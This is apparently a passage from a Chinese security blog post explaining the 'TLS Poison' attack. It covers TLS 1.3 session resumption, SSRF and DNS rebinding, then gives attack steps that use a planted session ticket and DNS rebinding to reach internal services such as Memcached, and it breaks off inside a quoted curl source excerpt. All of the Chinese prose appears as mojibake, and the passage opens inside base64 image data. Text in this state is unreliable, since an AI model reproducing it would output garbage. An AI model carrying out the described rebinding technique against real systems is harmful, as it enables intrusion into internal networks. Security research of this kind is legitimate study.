LV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/3.png" alt=""></p><p>å¯èƒ½æœ‰åŒå­¦ä¼šé—®ä¸ºä»€ä¹ˆæˆ‘ä»¬çœ‹ä¸åˆ°ç±»ä¼¼ TLS 1.2 å½“ä¸­ç›´æ¥æœ‰ä¸€ä¸ª NewSessionTicket å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä»”ç»†å›é¡¾ä¸€ä¸‹ä¸Šé¢çš„ RFC æµç¨‹å›¾ï¼ŒServer è¿”å›çš„ NewSessionTicket æ¶ˆæ¯æœ‰ä¸ªä¸­æ‹¬å·ï¼Œè€Œè¿™é‡Œçš„ä¸­æ‹¬å·è¡¨ç¤ºçš„æ˜¯ä½¿ç”¨ä» <code>[sender]_application_traffic_secret_N</code> å¯¼å‡ºçš„å¯†é’¥ä¿æŠ¤çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ wireshark æ— æ³•ç›´æ¥çœ‹åˆ°å…¶ä¸­çš„å†…å®¹ï¼Œä½†æ˜¯å…¶ä¸­æˆ‘ä»¬ä½¿ç”¨ opnssl æ—¶å€™èƒ½å¤Ÿæ›´æ˜æ˜¾çš„çœ‹åˆ° Server å‘è¿‡æ¥çš„ TLS Session Ticket ï¼Œå¦‚å›¾æ‰€ç¤ºï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ Client åœ¨è¿›è¡Œæ¢å¤ä¼šè¯æ—¶æ‰€æºå¸¦çš„ PSK ï¼Œåœ¨ä½¿ç”¨ openssl è¿›è¡Œæ¢å¤ä¼šè¯æ—¶ï¼Œå°±ä¼šæç¤ºæˆ‘ä»¬å·²ç»æ¢å¤äº†ä¼šè¯ã€‚è¿™æ ·å°±å®Œæˆäº†ä¸€æ¬¡ Session Resumption</p><h4 id="TLS-1-3-Session-Resumption-0-RTT"><a href="#TLS-1-3-Session-Resumption-0-RTT" class="headerlink" title="TLS 1.3 Session Resumption - 0-RTT"></a>TLS 1.3 Session Resumption - 0-RTT</h4><p>è™½ç„¶ TLS 1.3 æœ€å¤§çš„äº®ç‚¹ä¹‹ä¸€æ˜¯ 0-RTT ï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œä¸åšè¯¦ç»†çš„åˆ†æï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥ä»ä¸‹é¢çš„ RFC 8446 æä¾›çš„æµç¨‹å›¾çœ‹å‡ºæ¥ï¼Œè™½ç„¶å¢åŠ äº†ä¸€ä¸ª early_data ï¼Œä½†æ˜¯å¯¹äºæœ¬ç¯‡æ–‡ç« æ¥è¯´å¹¶ä¸æ˜¯é‡ç‚¹ï¼Œä»–ä¾ç„¶ä½¿ç”¨äº† pre_shared_key ï¼Œæ‰€ä»¥å¯¹äºä¸Šæ–‡åŸºäº PSK çš„ä¼šè¯æ¢å¤æ¨¡å¼æ¥è¯´åŸºæœ¬ä¸€è‡´ï¼Œè¿™é‡Œå°±ä¸åšè¿‡å¤šåˆ†æï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥è‡ªè¡Œæœç´¢äº†è§£ã€‚ </p><p></p><figure class="highlight routeros hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Client                                               Server</span><br><span class="line"></span><br><span class="line">ClientHello</span><br><span class="line">+ early_data</span><br><span class="line">+ key_share*</span><br><span class="line">+ psk_key_exchange_modes</span><br><span class="line">+ pre_shared_key</span><br><span class="line">(Application Data*)     --------&gt;</span><br><span class="line">                                                ServerHello</span><br><span class="line">                                           + pre_shared_key</span><br><span class="line">                                               + key_share*</span><br><span class="line">                                      {EncryptedExtensions}</span><br><span class="line">                                              + early_data*</span><br><span class="line">                                                 {Finished}</span><br><span class="line">                        &lt;--------       [Application Data*]</span><br><span class="line">(EndOfEarlyData)</span><br><span class="line">{Finished}              --------&gt;</span><br><span class="line">[Application Data]      &lt;-------&gt;        [Application Data]</span><br><span class="line"></span><br><span class="line">      +  Indicates noteworthy extensions sent <span class="hljs-keyword">in</span> the</span><br><span class="line">         previously noted message.</span><br><span class="line"></span><br><span class="line">      *  Indicates optional <span class="hljs-keyword">or</span> situation-dependent</span><br><span class="line">         messages/extensions that are <span class="hljs-keyword">not</span> always sent.</span><br><span class="line"></span><br><span class="line">      () Indicates messages protected using keys</span><br><span class="line">         derived <span class="hljs-keyword">from</span> a client_early_traffic_secret.</span><br><span class="line"></span><br><span class="line">      {} Indicates messages protected using keys</span><br><span class="line">         derived <span class="hljs-keyword">from</span> a [sender]_handshake_traffic_secret.</span><br><span class="line"></span><br><span class="line">      [] Indicates messages protected using keys</span><br><span class="line">         derived <span class="hljs-keyword">from</span> [sender]_application_traffic_secret_N.</span><br><span class="line"></span><br><span class="line">      Figure 4: Message Flow <span class="hljs-keyword">for</span> a 0-RTT Handshake</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€  (Server-Side Request Forgery, SSRF) æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ï¼ˆæ­£æ˜¯å› ä¸ºå®ƒæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥å®ƒèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰</p><p>SSRF å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶ã€‚æ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://dpsvdv74uwwos.cloudfront.net/statics/img/blogposts/exploiting_ssrf_vulnerability.png" alt=""></p><h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>DNSé‡æ–°ç»‘å®šæ˜¯è®¡ç®—æœºæ”»å‡»çš„ä¸€ç§å½¢å¼ã€‚ åœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œæ¶æ„ç½‘é¡µä¼šå¯¼è‡´è®¿é—®è€…è¿è¡Œå®¢æˆ·ç«¯è„šæœ¬ï¼Œæ”»å‡»ç½‘ç»œä¸Šå…¶ä»–åœ°æ–¹çš„è®¡ç®—æœºã€‚æ”»å‡»è€…æ³¨å†Œä¸€ä¸ªåŸŸåï¼ˆå¦‚attacker.comï¼‰ï¼Œå¹¶åœ¨æ”»å‡»è€…æ§åˆ¶ä¸‹å°†å…¶ä»£ç†ç»™DNSæœåŠ¡å™¨ã€‚ æœåŠ¡å™¨é…ç½®ä¸ºå¾ˆçŸ­å“åº”æ—¶é—´çš„TTLè®°å½•ï¼Œé˜²æ­¢å“åº”è¢«ç¼“å­˜ã€‚ å½“å—å®³è€…æµè§ˆåˆ°æ¶æ„åŸŸæ—¶ï¼Œæ”»å‡»è€…çš„DNS æœåŠ¡å™¨é¦–å…ˆç”¨æ‰˜ç®¡æ¶æ„å®¢æˆ·ç«¯ä»£ç çš„æœåŠ¡å™¨çš„ IP åœ°å€ä½œå‡ºå“åº”ã€‚ ä¾‹å¦‚ï¼Œä»–ä»¬å¯ä»¥å°†å—å®³è€…çš„æµè§ˆå™¨æŒ‡å‘åŒ…å«æ—¨åœ¨åœ¨å—å®³è€…è®¡ç®—æœºä¸Šæ‰§è¡Œçš„æ¶æ„ JavaScript æˆ– Flash è„šæœ¬çš„ç½‘ç«™ã€‚</p><p>æ¶æ„å®¢æˆ·ç«¯ä»£ç ä¼šå¯¹åŸå§‹åŸŸåï¼ˆä¾‹å¦‚attacker.comï¼‰è¿›è¡Œé¢å¤–è®¿é—®ï¼Œè¿™äº›éƒ½æ˜¯ç”±åŒæºæ”¿ç­–æ‰€å…è®¸çš„ã€‚ ä½†æ˜¯ï¼Œå½“å—å®³è€…çš„æµè§ˆå™¨è¿è¡Œè¯¥è„šæœ¬æ—¶ï¼Œå®ƒä¼šä¸ºè¯¥åŸŸåˆ›å»ºä¸€ä¸ªæ–°çš„ DNS è¯·æ±‚ï¼Œå¹¶ä¸”æ”»å‡»è€…ä¼šä½¿ç”¨æ–°çš„ IP åœ°å€è¿›è¡Œå›å¤ã€‚ ä¾‹å¦‚ï¼Œä»–ä»¬å¯ä»¥ä½¿ç”¨å†…éƒ¨ IP åœ°å€æˆ–äº’è”ç½‘ä¸ŠæŸä¸ªç›®æ ‡çš„IPåœ°å€è¿›è¡Œå›å¤ã€‚</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://torbencapiau.be/wp-content/uploads/2019/12/chrome_O70990jBNt-1024x574.png" alt=""></p><h2 id="TLS-Poison"><a href="#TLS-Poison" class="headerlink" title="TLS Poison"></a>TLS Poison</h2><p>å¥½äº†ï¼Œç»ˆäºä»‹ç»å®ŒèƒŒæ™¯çŸ¥è¯†äº†ï¼Œç°åœ¨è®©æˆ‘ä»¬æ¥çœ‹çœ‹æœ¬æ¬¡è¦ä»‹ç»çš„ TLS Poison æ”»å‡»ã€‚</p><p>è¿™é‡Œä¸€å¥è¯å¸®å¤§å®¶æ€»ç»“æ¦‚æ‹¬ä¸€ä¸‹ï¼šæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ TLS Session Resumption çš„ç‰¹æ€§ç»“åˆ DNS Rebinding æŠ€å·§æ“ä½œä¸€äº›å®¢æˆ·ç«¯å¸®åŠ©æˆ‘ä»¬è¿›è¡Œ SSRF æ”»å‡»ã€‚</p><p>å…¶å®æ•´ä¸ªæ”»å‡»å°±åƒä¸Šè¿°è¯´çš„ä¸€æ ·ï¼Œéå¸¸é€šä¿—æ˜“æ‡‚ï¼Œæ— éå°±æ˜¯ TLS Session Resumption ã€ DNS Rebinding ã€ä¸€ä¸ªå‚»ç™½ç”œå—å®³è€…ï¼Œç»“åˆåœ¨ä¸€èµ·å°±ä¾¿æœ‰äº†æˆ‘ä»¬çš„ TLS Poison ã€‚</p><p><strong>PS: å¦‚æ— ç‰¹æ®Šè¯´æ˜ï¼Œæ•´ä¸ªå®éªŒèƒŒæ™¯å‡åŸºäº Ubuntu 20.04 LTS ï¼Œcurl 7.68.0 build with OpenSSL/1.1.1f  ï¼Œåæ–‡æåˆ°çš„ IPv6 å‡æŒ‡çš„æ˜¯  IPv4-mapped IPv6 addresses è¿™ç±»åœ°å€</strong></p><h3 id="Attack-Steps"><a href="#Attack-Steps" class="headerlink" title="Attack Steps"></a>Attack Steps</h3><p>è®©æˆ‘ä»¬è¿›ä¸€æ­¥æ¥çœ‹çœ‹è¿™ä¸ªæ”»å‡»æ€è·¯ï¼š</p><ol><li>é¦–å…ˆæˆ‘ä»¬å¯ä»¥ä»èƒŒæ™¯çŸ¥è¯†å½“ä¸­çŸ¥é“ TLS Session Resumption ç‰¹æ€§ï¼Œæ— è®ºæ˜¯ TLS 1.2 æˆ–è€… 1.3 ï¼Œå®ƒä»¬éƒ½ä¼šä½¿ç”¨äº†ä¸€ä¸ªå‡­æ®ä¸€æ ·çš„ä¸œè¥¿æ¥è¡¨æ˜å®¢æˆ·ç«¯çš„èº«ä»½ï¼Œå°±åƒåœ¨ Web æµè§ˆä¸­çš„ Cookie ä¸€æ ·ï¼Œè¿™ä¸ªå‡­æ®åˆæ˜¯ç”±æœåŠ¡ç«¯ä¸‹å‘ç»™å®¢æˆ·ç«¯çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªæ¶æ„çš„ Server ï¼Œè®©ä¸€ä¸ªå®¢æˆ·ç«¯ä½¿ç”¨ HTTPS è®¿é—®æˆ‘ä»¬çš„æœåŠ¡å™¨æ—¶ï¼Œåœ¨ TLS æ¡æ‰‹æ—¶è¿™ä¸ªå‡­æ®å°±æ˜¯æˆ‘ä»¬æ¶æ„æœåŠ¡å™¨åˆ†é…ç»™å®¢æˆ·ç«¯çš„ï¼Œè€Œå®¢æˆ·ç«¯ä¼šæŠŠè¿™ä¸ªå‡­æ®æŒ‰ç…§<strong>ä¸€å®šè§„åˆ™</strong>å­˜å‚¨èµ·æ¥ï¼Œä»¥ä¾¿ä»¥åéœ€è¦è·Ÿæˆ‘ä»¬æ¶æ„æœåŠ¡å™¨æ¢å¤ä¸Šä¸€æ¬¡ä¼šè¯æ—¶ä½¿ç”¨ã€‚æ‰€ä»¥ï¼Œä»è¿™é‡Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå¦‚æœå¯ä»¥è®©å®¢æˆ·ç«¯ä»¥ HTTPS å½¢å¼è®¿é—®ä»»æ„æœåŠ¡å™¨ï¼Œåœ¨è¿›è¡Œ TLS æ¡æ‰‹æ—¶æˆ‘ä»¬å¯ä»¥è®©å®¢æˆ·ç«¯å­˜å‚¨æˆ‘ä»¬æŒ‡å®šçš„ä¼šè¯å‡­æ®ã€‚</li><li>æ¥ç€ï¼Œåœ¨è¿›è¡Œ HTTPS è¯·æ±‚å‰ï¼Œå®¢æˆ·ç«¯å¿…å®šéœ€è¦å¯¹æˆ‘ä»¬ç»™çš„åŸŸåè¿›è¡Œä¸€æ¬¡ DNS æŸ¥è¯¢ï¼Œè€Œåœ¨å®¢æˆ·ç«¯æƒ³è¦æ¢å¤ä¼šè¯çš„æ—¶å€™ï¼Œ<strong>å¦‚æœå®¢æˆ·ç«¯çš„ DNS ç¼“å­˜è¿‡æœŸ</strong>ï¼Œåˆ™åˆä¼šè¿›è¡Œä¸€æ¬¡ DNS æŸ¥è¯¢ï¼›å¦‚æœæ²¡æœ‰è¿‡æœŸï¼Œåˆ™åˆ©ç”¨ä¹‹å‰çš„ DNS æŸ¥è¯¢ç»“æœå¾—åˆ°çš„ IP è¿›è¡Œæ¢å¤ä¼šè¯ã€‚æ‰€ä»¥å½“æ¡ä»¶æ»¡è¶³ï¼Œä¹Ÿå°±æ˜¯æ­£å¥½åœ¨å®¢æˆ·ç«¯æƒ³è¦æ¢å¤ TLS ä¼šè¯ï¼Œè€Œ DNS ç¼“å­˜åˆè¿‡æœŸäº†çš„æ—¶å€™ï¼Œå°±ä¼šå‘èµ·ä¸€æ¬¡ DNS æŸ¥è¯¢ï¼Œè¿™é‡Œæ­£å¥½å°±æ»¡è¶³äº† DNS Rebinding çš„æ¡ä»¶ã€‚</li><li>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ä¸ºè‡ªå·±çš„åŸŸåæ­å»ºä¸€ä¸ª DNS æœåŠ¡å™¨ï¼Œåœ¨å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡å‘èµ· DNS è¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬è®© DNS æœåŠ¡å™¨è¿”å›æ­£ç¡®çš„ã€æŒ‡å‘æˆ‘ä»¬æ¶æ„æœåŠ¡å™¨çš„ IP ï¼Œè®©ç¬¬ä¸€æ¬¡ TLS æ¡æ‰‹æˆåŠŸï¼Œä¹Ÿè®©å®¢æˆ·ç«¯ç¼“å­˜æˆ‘ä»¬åˆ¶å®šçš„ä¼šè¯å‡­æ®ï¼›åœ¨å®¢æˆ·ç«¯æ¢å¤ä¼šè¯æ—¶ï¼Œä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯å‘èµ·ç¬¬äºŒæ¬¡ DNS è¯·æ±‚æ—¶ï¼Œæˆ‘ä»¬è®© DNS æœåŠ¡å™¨è¿”å›æˆ‘ä»¬æƒ³è¦æ”»å‡»çš„å†…ç½‘åœ°å€ï¼Œä¾‹å¦‚ 127.0.0.1 ï¼Œè¿™æ ·åœ¨å®¢æˆ·ç«¯å°è¯•æ¢å¤ä¼šè¯çš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯ä¼šæ‹¿ç€æˆ‘ä»¬ç»™å®ƒçš„ç‰¹åˆ¶ç¥¨æ®å»ä¸è¿™ä¸ªåœ°å€å°è¯•è¿›è¡Œ TLS æ¡æ‰‹ã€‚</li><li>è¿™æ„å‘³ç€ä»€ä¹ˆå‘¢ï¼Ÿç‰¹åˆ¶çš„ç¥¨æ®ã€æŒ‡å®šçš„å†…ç½‘åœ°å€ï¼Œå°±æ„æˆäº†ä¸€æ¬¡å¯¹å†…ç½‘æœåŠ¡çš„è¯·æ±‚ï¼</li></ol><p>ä½†æ˜¯ä¼¼ä¹æˆ‘ä»¬åˆå¿½ç•¥äº†ä»€ä¹ˆï¼Ÿå¦‚æœæˆ‘æƒ³æ”»å‡»å†…ç½‘çš„ Memcached ï¼Œç«¯å£åœ¨ 11211 ä¸åœ¨ 443 æ€ä¹ˆåŠï¼Ÿæ­£å¦‚æˆ‘ä»¬ä¸Šé¢æ‰€å¼ºè°ƒçš„â€œå®¢æˆ·ç«¯ä¼šæŠŠè¿™ä¸ªå‡­æ®æŒ‰ç…§<strong>ä¸€å®šè§„åˆ™</strong>å­˜å‚¨èµ·æ¥â€ï¼Œé‚£ä¹ˆè¿™ä¸ª<strong>ä¸€å®šè§„åˆ™</strong>åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><p>æˆ‘ä»¬å¯ä»¥éšä¾¿æ‰¾ä¸ªä¾‹å­æ¥çœ‹ï¼Œæ¯”å¦‚ curl 7.75.0 ï¼Œåœ¨ curl æºç çš„ lib/vtls/vtls.c#408 æ–‡ä»¶å½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è¿™æ ·çš„ä»£ç ï¼š</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; data-&gt;<span class="hljs-built_in">set</span>.general_ssl.max_ssl_sessions; i++) {</span><br><span class="line">  check = &amp;data-&gt;state.session[i];</span><br><span class="line">  <span class="hljs-keyword">if</span>(!check-&gt;sessionid)</span><br><span class="line">    <span class="hljs-comment">/* not session ID means blank entry */</span></span><br><span class="line">    <span class="hljs-keyword">continue</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span>(strcasecompare(name, check-&gt;name) &amp;&amp;</span><br><span class="line">     ((!conn-&gt;bits.conn_to_host &amp;&amp; !check-&gt;conn_to_host) 